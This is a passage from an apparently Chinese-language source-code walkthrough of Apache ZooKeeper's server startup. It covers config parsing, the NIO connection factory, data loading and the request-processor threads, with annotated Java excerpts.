config.parse(args[0]); &#125; // Start and schedule the the purge task DatadirCleanupManager purgeMgr = new DatadirCleanupManager(config .getDataDir(), config.getDataLogDir(), config .getSnapRetainCount(), config.getPurgeInterval()); purgeMgr.start(); // 如果参数长度为1,并且配置的server大于0则为集群模式 if (args.length == 1 &amp;&amp; config.servers.size() &gt; 0) &#123; runFromConfig(config); &#125; else &#123; LOG.warn(\"Either no config or no quorum defined in config, running \" + \" in standalone mode\"); // 单机运行 ZooKeeperServerMain.main(args); &#125; &#125; 加载配置信息，判断以集群还是单机方式运行。下面先看解析配置和单机运行的源码。 zoo.cfg 封装为 QuorumPeerConfig将 zoo.cfg 配置信息解析封装为 QuorumPeerConfig。 1234567891011121314151617181920212223242526272829303132/** * *@param path 配置文件路径 */public void parse(String path) throws ConfigException &#123; File configFile = new File(path); LOG.info(\"Reading configuration from: \" + configFile); try &#123; if (!configFile.exists()) &#123; throw new IllegalArgumentException(configFile.toString() + \" file is missing\"); &#125; Properties cfg = new Properties(); FileInputStream in = new FileInputStream(configFile); try &#123; //加载到Properties cfg.load(in); &#125; finally &#123; in.close(); &#125; //从Properties加载 parseProperties(cfg); &#125; catch (IOException e) &#123; throw new ConfigException(\"Error processing \" + path, e); &#125; catch (IllegalArgumentException e) &#123; throw new ConfigException(\"Error processing \" + path, e); &#125; &#125; 将加载后的 properties 信息赋值到 QuorumPeerConfig 属性中。省略了一部分解析的代码. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278/** * 解析properties对象信息, * @param zkProp 根据配置文件加载的properties对象信息 */ public void parseProperties(Properties zkProp) throws IOException, ConfigException &#123; int clientPort = 0; String clientPortAddress = null; //获取键值对信息循环匹配赋值、验证合法性 for (Entry&lt;Object, Object&gt; entry : zkProp.entrySet()) &#123; String key = entry.getKey().toString().trim(); String value = entry.getValue().toString().trim(); //数据目录 if (key.equals(\"dataDir\")) &#123; dataDir = value; //日志目录 &#125; else if (key.equals(\"dataLogDir\")) &#123; dataLogDir = value; //绑定端口 &#125; else if (key.equals(\"clientPort\")) &#123; clientPort = Integer.parseInt(value); // 判断身份类型,observer不参与投票,participant参与投票 &#125; else if (key.equals(\"peerType\")) &#123; if (value.toLowerCase().equals(\"observer\")) &#123; peerType = LearnerType.OBSERVER; &#125; else if (value.toLowerCase().equals(\"participant\")) &#123; peerType = LearnerType.PARTICIPANT; &#125; else &#123; throw new ConfigException(\"Unrecognised peertype: \" + value); &#125; //同步启用 &#125; else if (key.equals( \"syncEnabled\" )) &#123; syncEnabled = Boolean.parseBoolean(value); //自动清理快照保留数量 &#125; else if (key.equals(\"autopurge.snapRetainCount\")) &#123; snapRetainCount = Integer.parseInt(value); //自动清理间隔 &#125; else if (key.equals(\"autopurge.purgeInterval\")) &#123; purgeInterval = Integer.parseInt(value); //是否配置了server集群 &#125; else if (key.startsWith(\"server.\")) &#123; int dot = key.indexOf('.'); long sid = Long.parseLong(key.substring(dot + 1)); String parts[] = splitWithLeadingHostname(value); if ((parts.length != 2) &amp;&amp; (parts.length != 3) &amp;&amp; (parts.length !=4)) &#123; LOG.error(value + \" does not have the form host:port or host:port:port \" + \" or host:port:port:type\"); &#125; LearnerType type = null; String hostname = parts[0]; Integer port = Integer.parseInt(parts[1]); Integer electionPort = null; if (parts.length &gt; 2)&#123; electionPort=Integer.parseInt(parts[2]); &#125; //置类型为observer或participant if (parts.length &gt; 3)&#123; if (parts[3].toLowerCase().equals(\"observer\")) &#123; type = LearnerType.OBSERVER; &#125; else if (parts[3].toLowerCase().equals(\"participant\")) &#123; type = LearnerType.PARTICIPANT; &#125; else &#123; throw new ConfigException(\"Unrecognised peertype: \" + value); &#125; &#125; //observer类型server if (type == LearnerType.OBSERVER)&#123; observers.put(Long.valueOf(sid), new QuorumServer(sid, hostname, port, electionPort, type)); &#125; else &#123; servers.put(Long.valueOf(sid), new QuorumServer(sid, hostname, port, electionPort, type)); &#125; //分组信息 &#125; else if (key.startsWith(\"group\")) &#123; int dot = key.indexOf('.'); long gid = Long.parseLong(key.substring(dot + 1)); numGroups++; String parts[] = value.split(\":\"); for(String s : parts)&#123; long sid = Long.parseLong(s); if(serverGroup.containsKey(sid)) throw new ConfigException(\"Server \" + sid + \"is in multiple groups\"); else serverGroup.put(sid, gid); &#125; //权重配置 &#125; else if(key.startsWith(\"weight\")) &#123; int dot = key.indexOf('.'); long sid = Long.parseLong(key.substring(dot + 1)); serverWeight.put(sid, Long.parseLong(value)); // SASL认证配置 &#125; else if (key.equals(QuorumAuth.QUORUM_SASL_AUTH_ENABLED)) &#123; quorumEnableSasl = Boolean.parseBoolean(value); &#125; else if (key.equals(QuorumAuth.QUORUM_SERVER_SASL_AUTH_REQUIRED)) &#123; quorumServerRequireSasl = Boolean.parseBoolean(value); &#125; else if (key.equals(QuorumAuth.QUORUM_LEARNER_SASL_AUTH_REQUIRED)) &#123; quorumLearnerRequireSasl = Boolean.parseBoolean(value); &#125; else if (key.equals(QuorumAuth.QUORUM_LEARNER_SASL_LOGIN_CONTEXT)) &#123; quorumLearnerLoginContext = value; &#125; else if (key.equals(QuorumAuth.QUORUM_SERVER_SASL_LOGIN_CONTEXT)) &#123; quorumServerLoginContext = value; &#125; else if (key.equals(QuorumAuth.QUORUM_KERBEROS_SERVICE_PRINCIPAL)) &#123; quorumServicePrincipal = value; //配置cnxn线程数 &#125; else if (key.equals(\"quorum.cnxn.threads.size\")) &#123; quorumCnxnThreadsSize = Integer.parseInt(value); &#125; else &#123; System.setProperty(\"zookeeper.\" + key, value); &#125; &#125; if (!quorumEnableSasl &amp;&amp; quorumServerRequireSasl) &#123; throw new IllegalArgumentException( QuorumAuth.QUORUM_SASL_AUTH_ENABLED + \" is disabled, so cannot enable \" + QuorumAuth.QUORUM_SERVER_SASL_AUTH_REQUIRED); &#125; if (!quorumEnableSasl &amp;&amp; quorumLearnerRequireSasl) &#123; throw new IllegalArgumentException( QuorumAuth.QUORUM_SASL_AUTH_ENABLED + \" is disabled, so cannot enable \" + QuorumAuth.QUORUM_LEARNER_SASL_AUTH_REQUIRED); &#125; // If quorumpeer learner is not auth enabled then self won't be able to // join quorum. So this condition is ensuring that the quorumpeer learner // is also auth enabled while enabling quorum server require sasl. if (!quorumLearnerRequireSasl &amp;&amp; quorumServerRequireSasl) &#123; throw new IllegalArgumentException( QuorumAuth.QUORUM_LEARNER_SASL_AUTH_REQUIRED + \" is disabled, so cannot enable \" + QuorumAuth.QUORUM_SERVER_SASL_AUTH_REQUIRED); &#125; // Reset to MIN_SNAP_RETAIN_COUNT if invalid (less than 3) // PurgeTxnLog.purge(File, File, int) will not allow to purge less // than 3. if (snapRetainCount &lt; MIN_SNAP_RETAIN_COUNT) &#123; LOG.warn(\"Invalid autopurge.snapRetainCount: \" + snapRetainCount + \". Defaulting to \" + MIN_SNAP_RETAIN_COUNT); snapRetainCount = MIN_SNAP_RETAIN_COUNT; &#125; if (dataDir == null) &#123; throw new IllegalArgumentException(\"dataDir is not set\"); &#125; if (dataLogDir == null) &#123; dataLogDir = dataDir; &#125; if (clientPort == 0) &#123; throw new IllegalArgumentException(\"clientPort is not set\"); &#125; if (clientPortAddress != null) &#123; this.clientPortAddress = new InetSocketAddress( InetAddress.getByName(clientPortAddress), clientPort); &#125; else &#123; this.clientPortAddress = new InetSocketAddress(clientPort); &#125; if (tickTime == 0) &#123; throw new IllegalArgumentException(\"tickTime is not set\"); &#125; if (minSessionTimeout &gt; maxSessionTimeout) &#123; throw new IllegalArgumentException( \"minSessionTimeout must not be larger than maxSessionTimeout\"); &#125; if (servers.size() == 0) &#123; if (observers.size() &gt; 0) &#123; throw new IllegalArgumentException(\"Observers w/o participants is an invalid configuration\"); &#125; // Not a quorum configuration so return immediately - not an error // case (for b/w compatibility), server will default to standalone // mode. return; &#125; else if (servers.size() == 1) &#123; if (observers.size() &gt; 0) &#123; throw new IllegalArgumentException(\"Observers w/o quorum is an invalid configuration\"); &#125; // HBase currently adds a single server line to the config, for // b/w compatibility reasons we need to keep this here. LOG.error(\"Invalid configuration, only one server specified (ignoring)\"); servers.clear(); // 检测验证，server只有两台无法容错，至少3台server &#125; else if (servers.size() &gt; 1) &#123; if (servers.size() == 2) &#123; LOG.warn(\"No server failure will be tolerated. \" + \"You need at least 3 servers.\"); //如果是偶数的配置server,会警告非最优配置 &#125; else if (servers.size() % 2 == 0) &#123; LOG.warn(\"Non-optimial configuration, consider an odd number of servers.\"); &#125; if (initLimit == 0) &#123; throw new IllegalArgumentException(\"initLimit is not set\"); &#125; if (syncLimit == 0) &#123; throw new IllegalArgumentException(\"syncLimit is not set\"); &#125; /* * If using FLE, then every server requires a separate election * port. */ if (electionAlg != 0) &#123; for (QuorumServer s : servers.values()) &#123; if (s.electionAddr == null) throw new IllegalArgumentException( \"Missing election port for server: \" + s.id); &#125; &#125; /* * Default of quorum config is majority * 默认的group是多个,并且一个server一个分组信息 */ if(serverGroup.size() &gt; 0)&#123; if(servers.size() != serverGroup.size()) throw new ConfigException(\"Every server must be in exactly one group\"); /* * The deafult weight of a server is 1 默认的权重为1 */ for(QuorumServer s : servers.values())&#123; if(!serverWeight.containsKey(s.id)) serverWeight.put(s.id, (long) 1); &#125; /* * Set the quorumVerifier to be QuorumHierarchical * 计算分组的权重 */ quorumVerifier = new QuorumHierarchical(numGroups, serverWeight, serverGroup); &#125; else &#123; /* * The default QuorumVerifier is QuorumMaj */ LOG.info(\"Defaulting to majority quorums\"); quorumVerifier = new QuorumMaj(servers.size()); &#125; //一旦计算出observers将放入Map中 servers.putAll(observers); //解析myid文件 File myIdFile = new File(dataDir, \"myid\"); if (!myIdFile.exists()) &#123; throw new IllegalArgumentException(myIdFile.toString() + \" file is missing\"); &#125; BufferedReader br = new BufferedReader(new FileReader(myIdFile)); String myIdString; try &#123; myIdString = br.readLine(); &#125; finally &#123; br.close(); &#125; try &#123; serverId = Long.parseLong(myIdString); MDC.put(\"myid\", myIdString); &#125; catch (NumberFormatException e) &#123; throw new IllegalArgumentException(\"serverid \" + myIdString + \" is not a number\"); &#125; // Warn about inconsistent peer type LearnerType roleByServersList = observers.containsKey(serverId) ? LearnerType.OBSERVER : LearnerType.PARTICIPANT; if (roleByServersList != peerType) &#123; LOG.warn(\"Peer type from servers list (\" + roleByServersList + \") doesn't match peerType (\" + peerType + \"). Defaulting to servers list.\"); peerType = roleByServersList; &#125; &#125; &#125; 配置主要是验证参数配置的合法性和对应属性信息的设置。 ZooKeeperServerMain 启动开始启动单点 server,主要的方法在 runFromConfig 中.主要的作用就是初始化 server 连接工厂,创建快照事务日志,启动 zk server. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748public void runFromConfig(ServerConfig config) throws IOException &#123; LOG.info(\"Starting server\"); FileTxnSnapLog txnLog = null; try &#123; // Note that this thread isn't going to be doing anything else, // so rather than spawning another thread, we will just call // run() in this thread. // create a file logger url from the command line args final ZooKeeperServer zkServer = new ZooKeeperServer(); // Registers shutdown handler which will be used to know the // server error or shutdown state changes. //注册shutdown处理 final CountDownLatch shutdownLatch = new CountDownLatch(1); zkServer.registerServerShutdownHandler( new ZooKeeperServerShutdownHandler(shutdownLatch)); //创建事务日志 txnLog = new FileTxnSnapLog(new File(config.dataLogDir), new File( config.dataDir)); txnLog.setServerStats(zkServer.serverStats()); zkServer.setTxnLogFactory(txnLog); zkServer.setTickTime(config.tickTime); zkServer.setMinSessionTimeout(config.minSessionTimeout); zkServer.setMaxSessionTimeout(config.maxSessionTimeout); //创建连接工厂,默认用JDK NIO cnxnFactory = ServerCnxnFactory.createFactory(); //设置地址和最大连接数 cnxnFactory.configure(config.getClientPortAddress(), config.getMaxClientCnxns()); //启动 cnxnFactory.startup(zkServer); // Watch status of ZooKeeper server. It will do a graceful shutdown // if the server is not running or hits an internal error. shutdownLatch.await(); shutdown(); cnxnFactory.join(); if (zkServer.canShutdown()) &#123; zkServer.shutdown(true); &#125; &#125; catch (InterruptedException e) &#123; // warn, but generally this is ok LOG.warn(\"Server interrupted\", e); &#125; finally &#123; if (txnLog != null) &#123; txnLog.close(); &#125; &#125; &#125; 下面主要来看 cnxnFactory.configure() 和 cnxnFactory.startup(zkServer)内部的主要实现。这里主要以 JDK NIO 的方式来启动 server,可以通过配置 zookeeper.serverCnxnFactory 参数来指定 server 实现方式,可选 Netty 方式启动. NIOServerCnxnFactory 的 configure 方法这个方法主要是启动 NIO server,并接收请求. 先看这个类的定义,实现 Runnable 接口。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546public class NIOServerCnxnFactory extends ServerCnxnFactory implements Runnable &#123; private static final Logger LOG = LoggerFactory.getLogger(NIOServerCnxnFactory.class); static &#123; /** * this is to avoid the jvm bug: * NullPointerException in Selector.open() * http://bugs.sun.com/view_bug.do?bug_id=6427854 */ try &#123; Selector.open().close(); &#125; catch(IOException ie) &#123; LOG.error(\"Selector failed to open\", ie); &#125; &#125; ServerSocketChannel ss; final Selector selector = Selector.open(); /** * We use this buffer to do efficient socket I/O. Since there is a single * sender thread per NIOServerCnxn instance, we can use a member variable to * only allocate it once. 分配了一个64M的空间. */ final ByteBuffer directBuffer = ByteBuffer.allocateDirect(64 * 1024); final HashMap&lt;InetAddress, Set&lt;NIOServerCnxn&gt;&gt; ipMap = new HashMap&lt;InetAddress, Set&lt;NIOServerCnxn&gt;&gt;( ); //默认最大连接数为60 int maxClientCnxns = 60; /** * Construct a new server connection factory which will accept an unlimited number * of concurrent connections from each client (up to the file descriptor * limits of the operating system). startup(zks) must be called subsequently. * @throws IOException */ public NIOServerCnxnFactory() throws IOException &#123; &#125;&#125; 配置连接信息，配置最大连接数。 12345678910111213141516171819202122@Overridepublic void configure(InetSocketAddress addr, int maxcc) throws IOException &#123; //配置sasl登录信息 configureSaslLogin(); //启动当前线程 thread = new ZooKeeperThread(this, \"NIOServerCxn.Factory:\" + addr); //设置为守护线程 thread.setDaemon(true); //赋值最大连接数 maxClientCnxns = maxcc; this.ss = ServerSocketChannel.open(); ss.socket().setReuseAddress(true); LOG.info(\"binding to port \" + addr); //绑定地址 ss.socket().bind(addr); // 设置为非阻塞IO ss.configureBlocking(false); //注册selector ss.register(selector, SelectionKey.OP_ACCEPT);&#125; 启动了当前线程并且启动 ServerSocker。来看一下 run 方法,主要是接收请求。 NIOServerCnxnFactory 的 run 方法run 方法来指定线程启动后的操作信息. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public void run() &#123; while (!ss.socket().isClosed()) &#123; try &#123; selector.select(1000); Set&lt;SelectionKey&gt; selected; synchronized (this) &#123; selected = selector.selectedKeys(); &#125; ArrayList&lt;SelectionKey&gt; selectedList = new ArrayList&lt;SelectionKey&gt;( selected); Collections.shuffle(selectedList); for (SelectionKey k : selectedList) &#123; // 接收连接请求 if ((k.readyOps() &amp; SelectionKey.OP_ACCEPT) != 0) &#123; SocketChannel sc = ((ServerSocketChannel) k .channel()).accept(); //获取serversocker的连接数 InetAddress ia = sc.socket().getInetAddress(); int cnxncount = getClientCnxnCount(ia); //判断是否超过配置最大连接数 if (maxClientCnxns &gt; 0 &amp;&amp; cnxncount &gt;= maxClientCnxns)&#123; LOG.warn(\"Too many connections from \" + ia + \" - max is \" + maxClientCnxns ); sc.close(); &#125; else &#123; LOG.info(\"Accepted socket connection from \" + sc.socket().getRemoteSocketAddress()); sc.configureBlocking(false); SelectionKey sk = sc.register(selector, SelectionKey.OP_READ); //获取连接信息，并添加到set中 NIOServerCnxn cnxn = createConnection(sc, sk); sk.attach(cnxn); addCnxn(cnxn); &#125; // 获取读写请求 &#125; else if ((k.readyOps() &amp; (SelectionKey.OP_READ | SelectionKey.OP_WRITE)) != 0) &#123; NIOServerCnxn c = (NIOServerCnxn) k.attachment(); //处理读写IO请求 c.doIO(k); &#125; else &#123; if (LOG.isDebugEnabled()) &#123; LOG.debug(\"Unexpected ops in select \" + k.readyOps()); &#125; &#125; &#125; selected.clear(); &#125; catch (RuntimeException e) &#123; LOG.warn(\"Ignoring unexpected runtime exception\", e); &#125; catch (Exception e) &#123; LOG.warn(\"Ignoring exception\", e); &#125; &#125; closeAll(); LOG.info(\"NIOServerCnxn factory exited run method\"); &#125; 主要来看 doIO 方法中请求的处理。所有的请求处理都在这个线程里处理。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166/** * Handles read/write IO on connection. */ void doIO(SelectionKey k) throws InterruptedException &#123; try &#123; // socket已关闭 if (isSocketOpen() == false) &#123; LOG.warn(\"trying to do i/o on a null socket for session:0x\" + Long.toHexString(sessionId)); return; &#125; //可读 if (k.isReadable()) &#123; //从Buffer读取数据 int rc = sock.read(incomingBuffer); if (rc &lt; 0) &#123; throw new EndOfStreamException( \"Unable to read additional data from client sessionid 0x\" + Long.toHexString(sessionId) + \", likely client has closed socket\"); &#125; //判断Buffer中元素数量(limit-position) if (incomingBuffer.remaining() == 0) &#123; boolean isPayload; if (incomingBuffer == lenBuffer) &#123; // start of next request //移动Buffer position和limit的位置,开始读取新加入缓存区的数据 incomingBuffer.flip(); isPayload = readLength(k); incomingBuffer.clear(); &#125; else &#123; // continuation isPayload = true; &#125; //非四字命令的情况 if (isPayload) &#123; // not the case for 4letterword readPayload(); &#125; else &#123; // four letter words take care // need not do anything else return; &#125; &#125; &#125; //可写 if (k.isWritable()) &#123; // ZooLog.logTraceMessage(LOG, // ZooLog.CLIENT_DATA_PACKET_TRACE_MASK // \"outgoingBuffers.size() = \" + // outgoingBuffers.size()); if (outgoingBuffers.size() &gt; 0) &#123; // ZooLog.logTraceMessage(LOG, // ZooLog.CLIENT_DATA_PACKET_TRACE_MASK, // \"sk \" + k + \" is valid: \" + // k.isValid()); /* * This is going to reset the buffer position to 0 and the * limit to the size of the buffer, so that we can fill it * with data from the non-direct buffers that we need to * send. */ ByteBuffer directBuffer = factory.directBuffer; directBuffer.clear(); for (ByteBuffer b : outgoingBuffers) &#123; if (directBuffer.remaining() &lt; b.remaining()) &#123; /* * When we call put later, if the directBuffer is to * small to hold everything, nothing will be copied, * so we've got to slice the buffer if it's too big. */ b = (ByteBuffer) b.slice().limit( directBuffer.remaining()); &#125; /* * put() is going to modify the positions of both * buffers, put we don't want to change the position of * the source buffers (we'll do that after the send, if * needed), so we save and reset the position after the * copy * 修改buffer的读取位置 */ int p = b.position(); directBuffer.put(b); b.position(p); if (directBuffer.remaining() == 0) &#123; break; &#125; &#125; /* * Do the flip: limit becomes position, position gets set to * 0. This sets us up for the write. */ directBuffer.flip(); int sent = sock.write(directBuffer); ByteBuffer bb; // Remove the buffers that we have sent while (outgoingBuffers.size() &gt; 0) &#123; bb = outgoingBuffers.peek(); if (bb == ServerCnxnFactory.closeConn) &#123; throw new CloseRequestException(\"close requested\"); &#125; int left = bb.remaining() - sent; if (left &gt; 0) &#123; /* * We only partially sent this buffer, so we update * the position and exit the loop. */ bb.position(bb.position() + sent); break; &#125; //更新发送数据包数量 packetSent(); /* We've sent the whole buffer, so drop the buffer */ sent -= bb.remaining(); outgoingBuffers.remove(); &#125; // ZooLog.logTraceMessage(LOG, // ZooLog.CLIENT_DATA_PACKET_TRACE_MASK, \"after send, // outgoingBuffers.size() = \" + outgoingBuffers.size()); &#125; synchronized(this.factory)&#123; if (outgoingBuffers.size() == 0) &#123; if (!initialized &amp;&amp; (sk.interestOps() &amp; SelectionKey.OP_READ) == 0) &#123; throw new CloseRequestException(\"responded to info probe\"); &#125; sk.interestOps(sk.interestOps() &amp; (~SelectionKey.OP_WRITE)); &#125; else &#123; sk.interestOps(sk.interestOps() | SelectionKey.OP_WRITE); &#125; &#125; &#125; &#125; catch (CancelledKeyException e) &#123; LOG.warn(\"CancelledKeyException causing close of session 0x\" + Long.toHexString(sessionId)); if (LOG.isDebugEnabled()) &#123; LOG.debug(\"CancelledKeyException stack trace\", e); &#125; close(); &#125; catch (CloseRequestException e) &#123; // expecting close to log session closure close(); &#125; catch (EndOfStreamException e) &#123; LOG.warn(e.getMessage()); if (LOG.isDebugEnabled()) &#123; LOG.debug(\"EndOfStreamException stack trace\", e); &#125; // expecting close to log session closure close(); &#125; catch (IOException e) &#123; LOG.warn(\"Exception causing close of session 0x\" + Long.toHexString(sessionId) + \": \" + e.getMessage()); if (LOG.isDebugEnabled()) &#123; LOG.debug(\"IOException stack trace\", e); &#125; close(); &#125; &#125; 主要是 JDK NIO 的相关 API 实现,比较麻烦一些,这里不做详细描述解释。几乎所有的请求处理都在这个方法处理的，这里没有过多深入。还包含 jute 反序列化、Request、RequestHeader、ReplyHeader 接收和相应请求的细节等在这里不做详细的说明. 启动 server 后下面看 ZooKeeperServer 的 startdata 的方法实现。 ZooKeeperServer 的 startdata 实现startdata 加载节点树、日志信息到内存中。 12345678910public void startdata() throws IOException, InterruptedException &#123; //check to see if zkDb is not null if (zkDb == null) &#123; zkDb = new ZKDatabase(this.txnLogFactory); &#125; if (!zkDb.isInitialized()) &#123; loadData(); &#125; &#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445/** * Restore sessions and data * 重新载入session和数据入内存 */ public void loadData() throws IOException, InterruptedException &#123; /* * When a new leader starts executing Leader#lead, it * invokes this method. The database, however, has been * initialized before running leader election so that * the server could pick its zxid for its initial vote. * It does it by invoking QuorumPeer#getLastLoggedZxid. * Consequently, we don't need to initialize it once more * and avoid the penalty of loading it a second time. Not * reloading it is particularly important for applications * that host a large database. * * The following if block checks whether the database has * been initialized or not. Note that this method is * invoked by at least one other method: * ZooKeeperServer#startdata. * * See ZOOKEEPER-1642 for more detail. */ if(zkDb.isInitialized())&#123; setZxid(zkDb.getDataTreeLastProcessedZxid()); &#125; else &#123; setZxid(zkDb.loadDataBase()); &#125; //清空超时的session信息,遍历删除对应的节点 LinkedList&lt;Long&gt; deadSessions = new LinkedList&lt;Long&gt;(); for (Long session : zkDb.getSessions()) &#123; if (zkDb.getSessionWithTimeOuts().get(session) == null) &#123; deadSessions.add(session); &#125; &#125; //设置状态为已初始化 zkDb.setDataTreeInit(true); //删除过期session节点信息 for (long session : deadSessions) &#123; // XXX: Is lastProcessedZxid really the best thing to use? killSession(session, zkDb.getDataTreeLastProcessedZxid()); &#125; &#125; 通过 volatile 来保证 db 初始化状态的可见性，保证 db 只能够初始化一次。循环遍历 session 超时的节点并删除节点。源码中有一段注释信息,Leader 调用 lead 方法的时候会调用该方法，但是 db 在选主之前已经初始化,所以 server 在第一次投票的时候不能用它自己的 zxid 参与投票。具体细节在集群启动的时候在深究。 ZooKeeperServer 的 startup 实现一个同步方法,创建 session 跟踪线程清理过期 session、注册 JMX。 123456789101112131415public synchronized void startup() &#123; //创建session跟踪 if (sessionTracker == null) &#123; createSessionTracker(); &#125; //启动session跟踪线程 startSessionTracker(); //启动请求处理线程 setupRequestProcessors(); //注册JMX registerJMX(); //设置server为运行中状态 setState(State.RUNNING); notifyAll(); &#125; 主要看请求处理的信息. 1234567891011protected void setupRequestProcessors() &#123; RequestProcessor finalProcessor = new FinalRequestProcessor(this); //同步请求处理线程 RequestProcessor syncProcessor = new SyncRequestProcessor(this, finalProcessor); //启动同步请求线程 ((SyncRequestProcessor)syncProcessor).start(); firstProcessor = new PrepRequestProcessor(this, syncProcessor); //启动预请求线程 ((PrepRequestProcessor)firstProcessor).start(); &#125; 下面看一下两个线程的 run 方法的处理逻辑. SyncRequestProcessor 的 run 方法12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273public void run() &#123; try &#123; int logCount = 0; // we do this in an attempt to ensure that not all of the servers // in the ensemble take a snapshot at the same time setRandRoll(r.nextInt(snapCount/2)); while (true) &#123; Request si = null; if (toFlush.isEmpty()) &#123; si = queuedRequests.take(); &#125; else &#123; si = queuedRequests.poll(); if (si == null) &#123; flush(toFlush); continue; &#125; &#125; if (si == requestOfDeath) &#123; break; &#125; if (si != null) &#123; // track the number of records written to the log if (zks.getZKDatabase().append(si)) &#123; logCount++; if (logCount &gt; (snapCount / 2 + randRoll)) &#123; setRandRoll(r.nextInt(snapCount/2)); // roll the log zks.getZKDatabase().rollLog(); // take a snapshot if (snapInProcess != null &amp;&amp; snapInProcess.isAlive()) &#123; LOG.warn(\"Too busy to snap, skipping\"); &#125; else &#123; snapInProcess = new ZooKeeperThread(\"Snapshot Thread\") &#123; public void run() &#123; try &#123; //将数据日志写到磁盘 zks.takeSnapshot(); &#125; catch(Exception e) &#123; LOG.warn(\"Unexpected exception\", e); &#125; &#125; &#125;; snapInProcess.start(); &#125; logCount = 0; &#125; &#125; else if (toFlush.isEmpty()) &#123; // optimization for read heavy workloads // iff this is a read, and there are no pending // flushes (writes), then just pass this to the next // processor if (nextProcessor != null) &#123; nextProcessor.processRequest(si); if (nextProcessor instanceof Flushable) &#123; ((Flushable)nextProcessor).flush(); &#125; &#125; continue; &#125; toFlush.add(si); if (toFlush.size() &gt; 1000) &#123; flush(toFlush); &#125; &#125; &#125; &#125; catch (Throwable t) &#123; handleException(this.getName(), t); running = false; &#125; LOG.info(\"SyncRequestProcessor exited!\"); &#125; 这个线程的主要任务就是将日志信息写到磁盘中。 PrepRequestProcessor 的 run 方法12345678910111213141516171819202122232425262728public void run() &#123; try &#123; while (true) &#123; //获取请求的信息 Request request = submittedRequests.take(); long traceMask = ZooTrace.CLIENT_REQUEST_TRACE_MASK; if (request.type == OpCode.ping) &#123; traceMask = ZooTrace.CLIENT_PING_TRACE_MASK; &#125; if (LOG.isTraceEnabled()) &#123; ZooTrace.logRequest(LOG, traceMask, 'P', request, \"\"); &#125; if (Request.requestOfDeath == request) &#123; break; &#125; //处理请求 pRequest(request); &#125; &#125; catch (RequestProcessorException e) &#123; if (e.getCause() instanceof XidRolloverException) &#123; LOG.info(e.getCause().getMessage()); &#125; handleException(this.getName(), e); &#125; catch (Exception e) &#123; handleException(this.getName(), e); &#125; LOG.info(\"PrepRequestProcessor exited loop!\"); &#125; 下面看处理请求的方法. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153protected void pRequest(Request request) throws RequestProcessorException &#123; // LOG.info(\"Prep&gt;&gt;&gt; cxid = \" + request.cxid + \" type = \" + // request.type + \" id = 0x\" + Long.toHexString(request.sessionId)); request.hdr = null; request.txn = null; try &#123; switch (request.type) &#123; case OpCode.create: CreateRequest createRequest = new CreateRequest(); pRequest2Txn(request.type, zks.getNextZxid(), request, createRequest, true); break; case OpCode.delete: DeleteRequest deleteRequest = new DeleteRequest(); pRequest2Txn(request.type, zks.getNextZxid(), request, deleteRequest, true); break; case OpCode.setData: SetDataRequest setDataRequest = new SetDataRequest(); pRequest2Txn(request.type, zks.getNextZxid(), request, setDataRequest, true); break; case OpCode.setACL: SetACLRequest setAclRequest = new SetACLRequest(); pRequest2Txn(request.type, zks.getNextZxid(), request, setAclRequest, true); break; case OpCode.check: CheckVersionRequest checkRequest = new CheckVersionRequest(); pRequest2Txn(request.type, zks.getNextZxid(), request, checkRequest, true); break; case OpCode.multi: MultiTransactionRecord multiRequest = new MultiTransactionRecord(); try &#123; ByteBufferInputStream.byteBuffer2Record(request.request, multiRequest); &#125; catch(IOException e) &#123; request.hdr = new TxnHeader(request.sessionId, request.cxid, zks.getNextZxid(), Time.currentWallTime(), OpCode.multi); throw e; &#125; List&lt;Txn&gt; txns = new ArrayList&lt;Txn&gt;(); //Each op in a multi-op must have the same zxid! long zxid = zks.getNextZxid(); KeeperException ke = null; //Store off current pending change records in case we need to rollback HashMap&lt;String, ChangeRecord&gt; pendingChanges = getPendingChanges(multiRequest); int index = 0; for(Op op: multiRequest) &#123; Record subrequest = op.toRequestRecord() ; /* If we've already failed one of the ops, don't bother * trying the rest as we know it's going to fail and it * would be confusing in the logfiles. */ if (ke != null) &#123; request.hdr.setType(OpCode.error); request.txn = new ErrorTxn(Code.RUNTIMEINCONSISTENCY.intValue()); &#125; /* Prep the request and convert to a Txn */ else &#123; try &#123; pRequest2Txn(op.getType(), zxid, request, subrequest, false); &#125; catch (KeeperException e) &#123; ke = e; request.hdr.setType(OpCode.error); request.txn = new ErrorTxn(e.code().intValue()); LOG.info(\"Got user-level KeeperException when processing \" + request.toString() + \" aborting remaining multi ops.\" + \" Error Path:\" + e.getPath() + \" Error:\" + e.getMessage()); request.setException(e); /* Rollback change records from failed multi-op */ rollbackPendingChanges(zxid, pendingChanges); &#125; &#125; //FIXME: I don't want to have to serialize it here and then // immediately deserialize in next processor. But I'm // not sure how else to get the txn stored into our list. ByteArrayOutputStream baos = new ByteArrayOutputStream(); BinaryOutputArchive boa = BinaryOutputArchive.getArchive(baos); request.txn.serialize(boa, \"request\") ; ByteBuffer bb = ByteBuffer.wrap(baos.toByteArray()); txns.add(new Txn(request.hdr.getType(), bb.array())); index++; &#125; request.hdr = new TxnHeader(request.sessionId, request.cxid, zxid, Time.currentWallTime(), request.type); request.txn = new MultiTxn(txns); break; //create/close session don't require request record case OpCode.createSession: case OpCode.closeSession: pRequest2Txn(request.type, zks.getNextZxid(), request, null, true); break; //All the rest don't need to create a Txn - just verify session case 